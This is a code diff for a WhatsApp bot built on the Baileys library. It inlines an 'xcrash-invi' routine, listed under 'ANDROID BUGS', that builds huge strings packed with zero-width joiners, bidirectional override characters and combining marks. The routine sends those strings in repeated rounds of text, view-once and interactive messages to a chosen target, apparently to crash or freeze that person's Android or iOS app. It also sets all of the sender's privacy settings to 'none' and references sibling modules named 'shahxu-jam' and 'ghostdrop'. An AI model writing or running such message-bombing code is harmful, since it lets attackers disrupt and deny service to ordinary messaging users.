@@ -38,7 +38,103 @@ const unauthorized = Buffer.from('8J+aqyBZb3UgYXJlIG5vdCBhdXRob3JpemVkIHRvIHVzZS
 const SYLoves = `./SY/S7/`;
 
 // ===== ANDROID BUGS =====
-const xcrashInviLogic = require(SYLoves + 'xcrash-invi');
+// ===== INLINE xcrash-invi =====
+const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
+
+function _buildAndroidDraft(seed = 0) {
+    const ZWJ = '\u200D', VS16 = '\uFE0F', RTL = '\u202E', LTR = '\u202D';
+    const unit = (ZWJ + VS16 + RTL + LTR).repeat(4);
+    const base = 'x'.repeat(40000);
+    return (base + unit.repeat(seed + 1)).repeat(2).slice(0, 120000);
+}
+function _buildIosDraft(seed = 0) {
+    const combining = '\u0301\u0302\u0303\u0304\u0305\u0306\u0307';
+    const base = 'a'.repeat(30000);
+    return (base + combining.repeat(seed + 1)).repeat(3).slice(0, 100000);
+}
+async function _xRelay(client, jid, content) {
+    const userJid = client?.user?.id || client?.authState?.creds?.me?.id;
+    const waMsg = generateWAMessageFromContent(jid, content, { userJid });
+    await client.relayMessage(jid, waMsg.message, { messageId: waMsg.key.id });
+    return waMsg.key.id;
+}
+async function _xArm(client) {
+    const ops = {
+        updateLastSeenPrivacy: 'none', updateOnlinePrivacy: 'none',
+        updateProfilePicturePrivacy: 'none', updateStatusPrivacy: 'none',
+        updateReadReceiptsPrivacy: 'none', updateGroupsAddPrivacy: 'none',
+        updateCallPrivacy: 'none',
+    };
+    let ok = 0;
+    for (const [m, v] of Object.entries(ops)) {
+        if (typeof client[m] !== 'function') continue;
+        try { await client[m](v); ok++; } catch {}
+    }
+    return ok;
+}
+async function _xJid(client, targetJid) {
+    try {
+        const store = client?.signalRepository?.lidMapping;
+        if (store && typeof store.getLIDForPN === 'function') {
+            const lid = await store.getLIDForPN(targetJid);
+            if (lid) return { jid: lid, mode: 'lid' };
+        }
+    } catch {}
+    return { jid: targetJid, mode: 'pn' };
+}
+async function _xSend(client, jid, content) {
+    try { await _xRelay(client, jid, content); return true; } catch { return false; }
+}
+
+const xcrashInviLogic = {
+    async xcrashInvi(client, targetJid, options = {}) {
+        const rounds = Number.isFinite(options.rounds) ? options.rounds : 4;
+        const gapMs  = Number.isFinite(options.gapMs) ? options.gapMs : 1200;
+        const useLid = options.useLid !== false;
+        const arm    = options.arm !== false;
+
+        const privacyArmed = arm ? await _xArm(client) : 0;
+        const resolved = useLid ? await _xJid(client, targetJid) : { jid: targetJid, mode: 'pn' };
+        const sendJid = resolved.jid;
+
+        for (let r = 0; r < rounds; r++) {
+            await _xSend(client, sendJid, {
+                extendedTextMessage: {
+                    text: _buildAndroidDraft(r),
+                    contextInfo: { mentionedJid: [sendJid], conversionSource: 'draft' },
+                },
+            });
+            await delay(gapMs);
+
+            await _xSend(client, sendJid, {
+                viewOnceMessage: { message: { extendedTextMessage: {
+                    text: _buildAndroidDraft(r + 10),
+                    contextInfo: { mentionedJid: [sendJid], conversionSource: 'viewonce' },
+                }}},
+            });
+            await delay(gapMs);
+
+            await _xSend(client, sendJid, {
+                extendedTextMessage: {
+                    text: _buildIosDraft(r),
+                    contextInfo: { mentionedJid: [sendJid], conversionSource: 'ios' },
+                },
+            });
+            await delay(gapMs);
+
+            await _xSend(client, sendJid, {
+                interactiveMessage: {
+                    body: { text: _buildAndroidDraft(r + 20) },
+                    nativeFlowMessage: { buttons: [{ name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'OK', id: 'x' }) }] },
+                },
+            });
+            await delay(gapMs);
+        }
+
+        return { jid: sendJid, mode: resolved.mode, rounds, privacyArmed };
+    }
+};
+// ===== END INLINE xcrash-invi =====
 console.log('[DEBUG] xcrash-invi exports:', Object.keys(xcrashInviLogic));
 const shahxuJamLogic  = require(SYLoves + 'shahxu-jam');
 const ghostdropLogic  = require(SYLoves + 'ghostdrop');
